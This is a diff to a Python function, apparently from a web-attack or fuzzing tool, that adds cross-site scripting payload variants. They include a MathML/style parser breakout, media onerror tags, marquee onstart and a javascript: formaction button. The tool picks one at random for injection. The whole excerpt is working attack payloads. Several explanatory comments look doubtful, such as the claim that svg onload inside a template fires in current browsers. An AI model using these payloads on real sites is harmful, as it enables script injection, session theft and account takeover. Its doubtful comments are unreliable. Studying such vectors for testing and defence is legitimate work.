@@ -148,6 +148,26 @@ def xss_tag_vector_swap(payload: str) -> str:
         f"<details open ontoggle={call}>",
         f"<input autofocus onfocus={call}>",
         f"<select autofocus onfocus={call}>",
+        # MathML integration-point breakout: <mpath> opened inside a <style>
+        # in a <math> context closes the math context, so the trailing <img>
+        # is parsed as a live element and its onerror fires.
+        f"<math><mtext></mtext><mglyph><style><mpath href=\"#</style><img src=x onerror={call}>",
+        # Media elements whose src fails to load fire onerror on their own.
+        f"<video src=x onerror={call}>",
+        f"<audio src=x onerror={call}>",
+        # <template> content: the inner <svg> still parses an onload handler
+        # via the parser's template-content handling (works in Chrome/FF).
+        f"<template><svg onload={call}>",
+        # <data> wraps the <img> so the onerror handler still attaches.
+        f"<data><img src=x onerror={call}>",
+        # Legacy form element; type=image renders it and src failure fires onerror.
+        f"<isindex type=image src=x onerror={call}>",
+        # Scrolling text: onstart fires as soon as the marquee begins scrolling.
+        f"<marquee onstart={call}>",
+        # <meter> with a value above max; onmouseover fires on hover.
+        f"<meter value=2 max=1 onmouseover={call}>",
+        # <button formaction=javascript:> submits to a javascript: URL on click.
+        f"<form><button formaction=javascript:{call}>",
     ]
     return random.choice(vectors)
 
